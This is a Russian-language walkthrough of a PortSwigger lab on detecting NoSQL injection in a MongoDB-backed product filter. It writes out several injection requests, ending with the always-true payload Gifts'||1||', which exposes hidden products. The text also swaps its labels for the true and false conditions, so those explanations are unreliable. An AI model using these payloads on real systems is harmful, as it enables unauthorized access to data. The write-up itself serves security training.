По заданию известно, что содержится уязвимость в базе MongoDB

перейдем на категорию подарков и найдем данный запрос в ххтп прокси
```
GET /filter?category=Gifts
```
и отправим данный запрос в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/1.%20Detecting%20NoSQL%20injection/pics%20for%20walktrough/1.png)
добавим `'` к запросу и увидим, что нам вернулся 200 хттп респонс код, но с внутренней ошибкой внутри сервиса 
```
GET /filter?category=Gifts'
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/1.%20Detecting%20NoSQL%20injection/pics%20for%20walktrough/2.png)
попробуем ввести `GET /filter?category=Gifts'+'` но в урл кодировке увидим, что запрос выполнился без ошибок
```
GET /filter?category=Gifts'%2b' 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/1.%20Detecting%20NoSQL%20injection/pics%20for%20walktrough/3.png)

Введем положительное условие
```
Gifts' && 0 && 'x -> GET /filter?category=Gifts'+%26%26+0+%26%26+'x
```
и увидим, что ничего не вывело

а вот если введем неверное условие, увидим
`Gifts' && 1 && 'x`

или же в url
```
GET /filter?category=Gifts'+%26%26+1+%26%26+'x 
```

Введем
```
GET /filter?category=Gifts'||1||'
```
и теперь мы можем видеть скрытые продукты 
и получим сообщение об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/12.%20NoSQL%20injection/1.%20Detecting%20NoSQL%20injection/pics%20for%20walktrough/4.png)
